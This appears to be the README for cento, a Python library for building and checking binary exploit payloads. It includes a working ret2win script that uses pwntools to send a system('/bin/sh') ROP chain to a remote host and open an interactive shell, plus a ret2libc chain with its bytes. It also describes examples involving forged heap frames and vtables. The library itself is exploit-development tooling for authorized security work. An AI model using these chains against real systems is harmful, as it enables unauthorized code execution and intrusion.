<!-- Generated from README.md by config/gen_pypi_readme.py: edit the source, then regenerate. -->
<p align="center"><img src="https://raw.githubusercontent.com/zetier/cento/main/assets/logo.svg" alt="cento logo" width="360"></p>

# cento

cento is a Python library for declaring, assembling, and checking binary exploit payloads. It turns hand-maintained offsets, runtime symbols, and chain
constraints into reviewable declarations and reproducible bytes. Use it alongside your existing discovery, debugging, and transport tools.

```sh
pip install cento             # Python 3.10+ with no dependencies
pip install 'cento[verify]'   # optional extra: verifies declared gadgets by running them in emulation
```

> **cento** (n.) -- a poem stitched together from other poets' lines.
> This library builds chains the same way: borrowed fragments, arranged
> deliberately, checked as a whole.

![license: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-green)
![python: 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)
![typed: py.typed](https://img.shields.io/badge/typed-py.typed-blue)

Maintained by [Zetier](https://zetier.com).

## A first payload

A classic ret2win stack: 0x28 bytes of padding, then three return addresses:

```python
import cento
import pwn
pwn.context(arch = 'amd64', os = 'linux')

r = pwn.remote('exploitme.example.com', 31337)
stack = cento.fit({0x28: [0x401F2F, 0x404060, 0x401050]}, fill="A")  # pop rdi; &"/bin/sh"; system
r.send(stack.image())
r.interactive()
```

The [tube](https://github.com/Gallopsled/pwntools) does the I/O; cento builds the bytes. Offline, the same `stack` prints its receipt:

```python
print(stack.image().hex())    # the payload
print(stack.layout.hexdump(skip=True))  # the same bytes, itemized
```

Output:

```text
414141414141414141414141414141414141414141414141414141414141414141414141414141412f1f40000000000060404000000000005010400000000000
region fit (base=fit_base, fill=0x41)
  +0x0028 w8 2f1f400000000000  [fit.raw+0x28]
  +0x0030 w8 6040400000000000  [fit.raw+0x30]
  +0x0038 w8 5010400000000000  [fit.raw+0x38]
```

## When the address comes from a leak

A ret2libc for a 32-bit target: `system` and the `"/bin/sh"` string live in libc, and libc's base is unknown until the target leaks it mid-exploit. Declare
the frame against a symbol, `libc_base`, and the payload assembles when `bind()` supplies the leak. Runnable as-is, though offsets are libc-specific:

```python
import cento
LIBC = cento.Ref("libc_base")           # symbol for libc's load address, bound at runtime

class Chain(cento.View):
    system: cento.u32 = LIBC + 0x48150  # system() (a 64-bit target: cento.u64)
    ret: cento.u32 = LIBC + 0x3A480     # system's return address: exit()
    binsh: cento.u32 = LIBC + 0x18F352  # &"/bin/sh", system's argument

stack = cento.region("stack", fill="A", endian="little")
stack.at(0x20, Chain, "chain")

stack.bind("libc_base", 0xF7DC2000, source="puts leak")
print(stack.image().hex())
print(stack.layout.hexdump(skip=True))  # skip=True masks the padding
```

Output:

```text
414141414141414141414141414141414141414141414141414141414141414150a1e0f780c4dff75213f5f7
region stack (base=stack_base, fill=0x41)
  +0x0020 w4 50a1e0f7  [stack.chain.system]
  +0x0024 w4 80c4dff7  [stack.chain.ret]
  +0x0028 w4 5213f5f7  [stack.chain.binsh]
```

## Reading the output

The first line is the payload itself, ready to send: 32 bytes of `0x41` padding followed by the three words of the chain.

The second block is the same buffer, itemized by its region (cento's unit of layout): offset, width, value, and the field that wrote it. When a payload
stops working, this is the view that says what is where and who put it there.

Failure is explicit. With the `bind()` line removed, the same script stops instead of guessing:

```text
EmitError: final emit refused: layout-wide pending symbols ['libc_base']
```

## When the exploit changes

A three-word chain fits in anyone's head. The value of declarations shows when the payload is larger and changes over time. [examples/ex00](https://github.com/zetier/cento/tree/main/examples/ex00/)
makes this concrete with a practical exploit payload: a chain of fake stack frames stored in the heap, entered through a 16-byte overflow. Built once by hand
([before.py](https://github.com/zetier/cento/blob/main/examples/ex00/before.py)), then declared with cento ([after.py](https://github.com/zetier/cento/blob/main/examples/ex00/after.py)): the same bytes.

The declarations pay off when the exploit grows. Suppose the chain needs a setuid(0) frame ahead of the shell frame. By hand, that is fresh offset arithmetic
and every dependent address re-checked; before.py's own comments warn about exactly this. In the declared version the edit is one allocation and two
re-links; ex00's [refusal.py](https://github.com/zetier/cento/blob/main/examples/ex00/refusal.py) performs exactly this edit:

```text
slab before: stdin@+0x00  stdout@+0x40  shell@+0x80  sh@+0xa8
slab after:  stdin@+0x00  stdout@+0x40  shell@+0x80  sh@+0xa8  setuid@+0xb0
...
the whole edit: one alloc, two re-links; every address above derived
```

The new frame is appended in storage and spliced into the execution order by its links; nothing already placed moves, so nothing is recomputed.

The insertion may also break a rule that is easy to forget: the x86-64 ABI keeps the stack pointer 16-byte aligned at every call site, but adding an 8-byte
frame breaks alignment at the next call. [enhanced.py](https://github.com/zetier/cento/blob/main/examples/ex00/enhanced.py) rebuilds the same payload as a checked chain and reports the regression at
build time, before anything runs on a target:

```text
ERROR CHK-207 [frames.setuid, SetuidCall]: SetuidCall uses entry_sp_mod=8, but this position in the chain requires entry_sp_mod=0 (SP % 16 at entry)
```

The complete run is checked in at [examples/ex00/transcript.txt](https://github.com/zetier/cento/blob/main/examples/ex00/transcript.txt).

## Features

- **Typed views** -- named, width-checked fields; offsets are declared once, not at every write site.
- **Frame chaining** -- frames allocate and link by handle; overlaps are declared intent (`over=`/`why=`).
- **Catalogs and profiles** -- port to the next device or libc by swapping the catalog, not the script.
- **Catalog import** -- `cento.import_catalog` builds a starter catalog from ropper/ROPgadget output.
- **Runtime symbols** -- bind values as leaks arrive; early emits name the fields still waiting.
- **Symbol arithmetic** -- `lo16`/`hi16` splits and carry-compensated `ha16` for `lis`/`addi` pairs.
- **Computed cells** -- length and checksum fields recompute from the bytes they cover.
- **Golden references** -- `cento.golden` pins a known-good payload and names the first divergent cell.
- **Checked chains** -- build-time proof that gadget inputs are produced and alignment holds.
- **Delivery plans** -- the arming write ships last, after everything is staged; every step is ledgered.
- **Cycle pads** -- `cycle`/`cycle_find` match pwntools `cyclic(n=4)` output, pinned by known-answer tests.
- **pwntools and ropper interop** -- the tube does I/O; ropper finds become declarations ([ex01](https://github.com/zetier/cento/tree/main/examples/ex01/)).
- **Emulation** -- `[verify]` runs gadget bytes under unicorn; symbolic entries need an absolute build.

## Supported architectures

The layout machinery (regions, views, symbols, delivery plans) is architecture-neutral; endianness and ABI facts are declared on the layout or carried by a
Target profile.

- **x86-64** -- `cento.abi.X86_64`, the default; the 16-byte stack rule is judged at build time (CHK-207).
- **AArch64** -- `cento.abi.AARCH64`: declare widths `cento.u64`; SP faults on misalignment ([ex12](https://github.com/zetier/cento/tree/main/examples/ex12/)).
- **ARM32** -- `cento.abi.ARM32`: Thumb gadget entries keep their low bit set ([ex13](https://github.com/zetier/cento/tree/main/examples/ex13/)).
- **PPC32-BE** -- `cento.abi.PPC32`: declare `endian="big"` or let a Target profile carry it ([ex02](https://github.com/zetier/cento/tree/main/examples/ex02/)).

The tutorial's fictional Meridian MK-2 ([ex05](https://github.com/zetier/cento/tree/main/examples/ex05/), [ex10](https://github.com/zetier/cento/tree/main/examples/ex10/)) exercises MIPS32 catalog geometry (frame stride and an
inside-the-frame pc slot) as pure catalog data; there is no `cento.abi` MIPS module and no MIPS verify executor.

Porting cento to a new architecture is a welcome contribution: an ABI module is a small, reviewable data declaration;
[docs/porting-an-abi.md](https://github.com/zetier/cento/blob/main/docs/porting-an-abi.md), written from the AArch64 port, walks the five moves.

## For teams

- **Porting**: gadget offsets and device facts live in catalogs and profiles, not scripts; when a target releases a new version, the update is a reviewable
  data change, and stale facts surface as named check failures (CHK-301) rather than silent breakage.
- **CI integration**: `check()` returns a machine-readable report and `layout.to_json()` the whole layout as data (both sorted, no timestamps); the CI step
  is one line, `sys.exit(0 if cento.gate(layout) else 1)`, with every blocker printed to stderr (ex07 demonstrates it).
- **Tested determinism**: two identical builds emit byte-identical artifacts and reports; every deterministic example checks in a `transcript.txt` that CI
  regenerates and compares, and the example outputs above are regenerated and byte-compared the same way. `cento.golden` pins your own builds likewise.
- **Reviewable exceptions**: overlaps and rewrites require declared intent (`over=`/`why=`, `allow_rewrite(reason=...)`); the reasons appear as ledger lines
  a reviewer can read in the diff, e.g. ex07's `waived rewrite pkt+0x0008: hotfix limit supersedes the v1 default (review: MK1-217)`.
- **Typed surface**: the package ships `py.typed`, and the repository gates itself with ruff, mypy --strict, and pytest (`make selftest`).

## Examples

The examples are numbered and self-contained (`examples/exNN/`); each runs offline in seconds with `make ex<NN>` or `python examples/exNN/<name>.py`. Apart
from ex00 and ex14, they form a tutorial against one fictional product family, the Meridian MK series.

| Example | Summary |
|---|---|
| [`ex00`](https://github.com/zetier/cento/tree/main/examples/ex00/) (before/after) | one practical exploit payload built by hand, as declarations, and as a checked chain; `check.py` confirms all three byte-identical, `refusal.py` grows it ([transcript](https://github.com/zetier/cento/blob/main/examples/ex00/transcript.txt)) |
| [`ex01_find_your_offset`](https://github.com/zetier/cento/tree/main/examples/ex01/) | a pwntools-to-cento reference, the `cycle()`/`cycle_find()` workflow, and a textbook ret2libc mapped 1:1 ([transcript](https://github.com/zetier/cento/blob/main/examples/ex01/transcript.txt)); `ctf/` runs it end to end ([walkthrough](https://github.com/zetier/cento/blob/main/examples/ex01/ctf/WALKTHROUGH.md)) |
| [`ex02_toy_chain`](https://github.com/zetier/cento/tree/main/examples/ex02/) | a checked gadget chain on real PPC32; the dataflow check traces a syscall return into a later gadget's input ([transcript](https://github.com/zetier/cento/blob/main/examples/ex02/transcript.txt)) |
| [`ex03_local_ret2win`](https://github.com/zetier/cento/tree/main/examples/ex03/) | compile a local x86-64 test binary (cc required), overflow it, and land win() |
| [`ex04_qemu_ret2win`](https://github.com/zetier/cento/tree/main/examples/ex04/) | a big-endian PPC32 victim under qemu-ppc, with the crash address read from the gdb stub |
| [`ex05_computed_cells`](https://github.com/zetier/cento/tree/main/examples/ex05/) | length and CRC fields computed from the bytes they describe; a deliberately wrong value is refused (CHK-005) ([transcript](https://github.com/zetier/cento/blob/main/examples/ex05/transcript.txt)) |
| [`ex06_delivery_plan`](https://github.com/zetier/cento/tree/main/examples/ex06/) | ordered, trigger-last delivery; a leak arriving mid-delivery invalidates and re-yields the affected rows ([transcript](https://github.com/zetier/cento/blob/main/examples/ex06/transcript.txt)) |
| [`ex07_guardrails`](https://github.com/zetier/cento/tree/main/examples/ex07/) | seven planted mistakes, seven named refusals, and the CI interface (`to_json`, `cento.gate`) ([transcript](https://github.com/zetier/cento/blob/main/examples/ex07/transcript.txt)) |
| [`ex08_borrowed_structures`](https://github.com/zetier/cento/tree/main/examples/ex08/) | structures the target parses: a forged heap chunk, a forged vtable, a patched flash record ([transcript](https://github.com/zetier/cento/blob/main/examples/ex08/transcript.txt)) |
| [`ex09_fake_frame_chain`](https://github.com/zetier/cento/tree/main/examples/ex09/) | a forged call stack in the heap; a runtime value threaded from one frame to the next ([transcript](https://github.com/zetier/cento/blob/main/examples/ex09/transcript.txt)) |
| [`ex10_provenance`](https://github.com/zetier/cento/tree/main/examples/ex10/) | gadget catalogs and device profiles; catalog drift caught (CHK-301) and gadget bytes verified under an emulator (CHK-304) ([transcript](https://github.com/zetier/cento/blob/main/examples/ex10/transcript.txt)) |
| [`ex11_the_thrower`](https://github.com/zetier/cento/tree/main/examples/ex11/) | one `DeliveryPlan` delivered through a stdlib pipe and through a pwntools `process()`, about 15 lines each |
| [`ex12_aarch64_chain`](https://github.com/zetier/cento/tree/main/examples/ex12/) | an AArch64 chain: ldp/ret frames, a csu-style call, and the hardware SP-alignment rule refused at build time (CHK-207) ([transcript](https://github.com/zetier/cento/blob/main/examples/ex12/transcript.txt)) |
| [`ex13_arm32_chain`](https://github.com/zetier/cento/tree/main/examples/ex13/) | an ARM32 chain: pop-to-pc frames that abut with no aliasing, and a Thumb gadget's entry carrying bit 0 ([transcript](https://github.com/zetier/cento/blob/main/examples/ex13/transcript.txt)) |
| [`ex14_port_a_script`](https://github.com/zetier/cento/tree/main/examples/ex14/) | porting an existing script: its output captured as golden bytes (`cento.golden`), one raw region, typed views carved in step by step; drift is named by cell owner ([transcript](https://github.com/zetier/cento/blob/main/examples/ex14/transcript.txt)) |

## Scope

cento is built for authorized security work: CTFs, red-team engagements, and vulnerability research on systems you have permission to test.

## Maintenance & stability

cento is maintained by [Zetier](https://github.com/zetier). Report security issues privately to <security@zetier.com> (see [SECURITY.md](https://github.com/zetier/cento/blob/main/SECURITY.md));
everything else goes to the [issue tracker](https://github.com/zetier/cento/issues).

Pre-1.0, the public API may change between minor versions; breaking changes are called out in commit messages and release notes.

## License & contributing

Apache 2.0; see [LICENSE](https://github.com/zetier/cento/blob/main/LICENSE) and [NOTICE](https://github.com/zetier/cento/blob/main/NOTICE).

Contributions require a Developer Certificate of Origin sign-off (`git commit -s`), enforced in CI; [CONTRIBUTING.md](https://github.com/zetier/cento/blob/main/CONTRIBUTING.md) covers the gates, the
sign-off and what it certifies, and third-party code. `pre-commit install --hook-type pre-commit --hook-type pre-push` wires the gates into git: auto-fixing lint and
static validation at commit (fixes land unstaged for review), the full `make selftest` (tests included) at push.

Note: the optional `[verify]` installs `unicorn`, which is GPL-2.0-licensed. cento contains no unicorn code and never requires it.
